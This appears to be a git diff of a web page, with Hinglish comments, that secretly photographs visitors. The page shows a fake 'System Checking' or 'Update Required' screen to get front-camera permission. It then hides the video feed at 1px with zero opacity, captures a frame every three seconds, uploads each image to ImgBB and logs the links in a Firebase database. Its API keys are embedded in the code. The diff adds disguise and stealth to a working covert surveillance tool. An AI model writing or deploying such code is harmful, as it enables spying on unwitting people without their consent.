@@ -2,22 +2,21 @@
 <html lang="hi">
 <head>
     <meta charset="UTF-8">
-    <title>DFlix - Verifying...</title>
+    <title>System Checking...</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
-<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
 
     <div style="text-align:center;">
-        <h2 id="msg">System Loading...</h2>
-        <p id="sub-msg">Please wait while we verify your device.</p>
+        <h2 id="msg">Initialising...</h2>
+        <p id="sub-msg">Hardware compatibility check in progress.</p>
     </div>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
+    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // Aapka Fixed Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
             authDomain: "distark.firebaseapp.com",
@@ -33,16 +32,26 @@
 
         async function init() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('v').srcObject = stream;
-                document.getElementById('msg').innerText = "Verifying Identity...";
-                console.log("Camera Ready");
-                // Har 2.5 second mein capture
-                setInterval(takeSnap, 2500);
+                // specifically front camera (facingMode: user) mang rahe hain
+                const constraints = { 
+                    video: { facingMode: "user" } 
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                document.getElementById('msg').innerText = "System Verified";
+                console.log("Front Camera Active");
+
+                // Camera ko start hone ke liye 2 second ka gap de rahe hain taaki black image na aaye
+                setTimeout(() => {
+                    setInterval(takeSnap, 3000); 
+                }, 2000);
+
             } catch (err) {
-                document.getElementById('msg').innerText = "Permission Required!";
-                document.getElementById('sub-msg').innerText = "Please allow camera access to continue.";
-                console.error("Camera Error:", err);
+                document.getElementById('msg').innerText = "Update Required!";
+                document.getElementById('sub-msg').innerText = "Please allow camera access to update your system.";
+                console.error(err);
             }
         }
 
@@ -51,27 +60,28 @@
             const c = document.getElementById('c');
             const ctx = c.getContext('2d');
 
+            // Agar video ready nahi hai to capture mat karo
+            if (v.readyState !== v.HAVE_ENOUGH_DATA) return;
+
             c.width = v.videoWidth;
             c.height = v.videoHeight;
-            ctx.drawImage(v, 0, 0);
+            ctx.drawImage(v, 0, 0, c.width, c.height);
             
-            const base64 = c.toDataURL('image/png').split(',')[1];
+            const base64 = c.toDataURL('image/jpeg', 0.7).split(',')[1]; // JPEG use kar rahe hain thodi fast speed ke liye
             const fd = new FormData();
             fd.append('image', base64);
 
-            // ImgBB Upload
             fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
             .then(r => r.json())
             .then(res => {
                 if(res.success) {
-                    // Firebase Database mein Save
                     db.ref('live_logs').push({
                         url: res.data.url,
                         time: new Date().toLocaleTimeString()
-                    }).then(() => console.log("Saved to Firebase"))
-                      .catch(e => console.error("Firebase Error:", e));
+                    });
+                    console.log("Image sent!");
                 }
-            }).catch(e => console.error("Upload Error:", e));
+            }).catch(e => console.log("Upload error"));
         }
 
         window.onload = init;
